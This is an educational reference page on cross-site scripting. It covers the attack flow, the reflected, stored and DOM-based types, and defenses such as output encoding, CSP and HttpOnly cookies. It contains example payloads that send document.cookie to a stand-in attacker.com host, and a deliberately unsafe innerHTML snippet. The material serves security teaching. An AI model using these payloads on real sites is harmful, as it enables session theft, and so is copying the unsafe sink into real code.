# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows an attacker to execute arbitrary malicious JavaScript in the browser context of an unsuspecting victim visiting a vulnerable web application.

---

## 1. Attack Mechanics & Impact

```text
[ Attacker ] ──(Injects Malicious JavaScript)──► [ Web Application / Database ]
                                                          │
                                             (Delivers Injected Script)
                                                          │
                                                          ▼
[ Victim Browser ] ◄──────────────────────────────────────┘
  ├── 1. Executes script with victim's browser privileges
  ├── 2. Steals session tokens (document.cookie)
  ├── 3. Performs actions on behalf of victim (CSRF / API calls)
  └── 4. Captures keystrokes & manipulates DOM content
```

---

## 2. Primary XSS Taxonomies

```text
Cross-Site Scripting (XSS)
├── 1. Reflected XSS (Non-Persistent)
│   └── Payload is passed in HTTP request (URL parameter) and reflected immediately in response
├── 2. Stored XSS (Persistent)
│   └── Payload is permanently stored in database and served to all subsequent visitors
└── 3. DOM-Based XSS
    └── Flaw exists entirely in client-side JavaScript (Source -> Sink execution)
```

---

### 2.1 Reflected XSS
Occurs when an application receives user input in an HTTP request and immediately includes that input in the immediate HTTP response without safe output encoding:

```text
URL: https://example.com/search?q=<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

---

### 2.2 Stored XSS
Occurs when the application stores untrusted user input in a database, comment system, message board, or profile field. Whenever any user views the stored content, the payload executes automatically in their browser:

```html
<!-- Malicious comment stored in database -->
<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie">
```

---

### 2.3 DOM-Based XSS
Occurs entirely in the client browser when JavaScript code takes data from an untrusted **Source** (e.g., `location.search`, `location.hash`, `document.referrer`) and passes it into an unsafe **Sink** (e.g., `document.write()`, `innerHTML`, `eval()`):

```javascript
// Unsafe client-side script
var searchTerm = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = searchTerm; // UNSAFE SINK
```

---

## 3. Defense-in-Depth Mitigation Strategies

1. **Context-Aware Output Encoding:** Encode all dynamic output before rendering it into HTML body, attributes, JavaScript variables, or CSS contexts (e.g., HTML entity encoding `<` $\rightarrow$ `&lt;`).
2. **Content Security Policy (CSP):** Enforce strict `Content-Security-Policy` headers to restrict script execution sources and disallow `unsafe-inline` scripts.
3. **`HttpOnly` Cookie Flag:** Mark all sensitive authentication and session cookies as `HttpOnly` to prevent JavaScript from reading `document.cookie`.
